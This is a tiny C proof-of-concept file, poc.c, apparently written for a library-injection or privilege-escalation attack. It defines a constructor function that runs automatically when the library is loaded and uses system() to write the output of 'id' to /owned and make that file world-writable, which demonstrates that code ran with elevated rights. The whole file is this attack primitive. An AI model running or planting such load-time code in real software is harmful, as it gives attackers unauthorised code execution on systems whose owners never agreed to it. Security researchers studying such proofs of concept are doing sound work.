// File: poc.c
# #include <stdio.h>
# #include <stdlib.h>
# #include <unistd.h>

# __attribute__((constructor))
# void run_on_load() {
#  
#    system("id > /owned && chmod 777 /owned");
# }